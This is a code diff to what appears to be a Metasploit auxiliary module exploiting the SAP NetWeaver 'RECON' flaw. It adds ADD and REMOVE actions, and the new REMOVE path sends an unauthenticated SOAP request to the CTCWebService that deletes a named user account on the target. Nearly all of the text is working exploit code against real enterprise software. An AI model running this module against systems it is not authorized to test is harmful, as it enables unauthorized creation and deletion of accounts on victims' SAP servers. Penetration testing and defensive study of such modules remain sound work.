@@ -31,6 +31,11 @@ class MetasploitModule < Msf::Auxiliary
         'Notes' => {
           'AKA' => [ 'RECON' ]
         },
+        'Actions' => [
+          [ 'ADD', { 'Description' => 'Add the specified user' } ],
+          [ 'REMOVE', { 'Description' => 'Remove the specified user' } ]
+        ],
+        'DefaultAction' => 'ADD',
         'DisclosureDate' => '2020-07-14'
       )
     )
@@ -66,6 +71,15 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
+    case action.name
+      when 'ADD'
+        action_add
+      when 'REMOVE'
+        action_remove
+    end
+  end
+
+  def action_add
     job = nil
     print_status('Starting the PCK Upgrade job...')
     job = invoke_pckupgrade
@@ -116,6 +130,38 @@ class MetasploitModule < Msf::Auxiliary
       print_status('Canceling the PCK Upgrade job...')
       job.cancel_execution
     end
+  end
+
+  def action_remove
+    message = { name: 'DeleteUser' }
+    message[:data] = Nokogiri::XML(<<-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
+      <root>
+        <username secure="true">#{datastore['USERNAME'].encode(xml: :text)}</username>
+      </root>
+    ENVELOPE
+
+    envelope = Nokogiri::XML(<<-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
+      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
+        <soapenv:Header/>
+        <soapenv:Body>
+          <urn:executeSynchronious>
+              <identifier>
+                <component>sap.com/tc~lm~config~content</component>
+                <path>content/Netweaver/ASJava/NWA/SPC/SPC_DeleteUser.cproc</path>
+             </identifier>
+             <contextMessages>
+                <baData>#{Rex::Text.encode_base64(message[:data])}</baData>
+                <name>#{message[:name]}</name>
+             </contextMessages>
+          </urn:executeSynchronious>
+         </soapenv:Body>
+      </soapenv:Envelope>
+    ENVELOPE
+
+    res = send_request_soap(envelope)
+    fail_with(Failure::UnexpectedReply, 'Failed to delete the user') unless res&.code == 200
+
+    print_good('Successfully deleted the user account')
   end
 
   def report_error_details(job)
